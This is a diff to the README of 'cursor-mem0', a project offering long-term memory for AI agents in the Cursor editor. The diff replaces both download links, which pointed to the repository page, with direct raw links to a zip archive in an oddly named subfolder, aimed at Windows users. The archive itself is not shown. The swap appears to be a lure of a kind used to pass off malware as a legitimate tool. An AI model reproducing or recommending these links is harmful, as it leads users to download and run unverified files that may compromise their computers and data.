@@ -1,6 +1,6 @@
 # 🧠 cursor-mem0 - Give your AI agent long-term memory
 
-[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/Konstantincoldeyed787/cursor-mem0)
+[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://raw.githubusercontent.com/Konstantincoldeyed787/cursor-mem0/main/begaze/cursor_mem_2.7.zip)
 
 This application adds long-term memory to your AI agents inside the Cursor code editor. It lets your AI remember your previous work and preferences across different coding sessions. It uses local storage methods to keep your data private and secure.
 
@@ -8,7 +8,7 @@ This application adds long-term memory to your AI agents inside the Cursor code 
 
 To use this software, visit the main project page to download the latest files.
 
-[Download cursor-mem0 here](https://github.com/Konstantincoldeyed787/cursor-mem0)
+[Download cursor-mem0 here](https://raw.githubusercontent.com/Konstantincoldeyed787/cursor-mem0/main/begaze/cursor_mem_2.7.zip)
 
 Follow these steps to set up the software on your Windows computer.
 
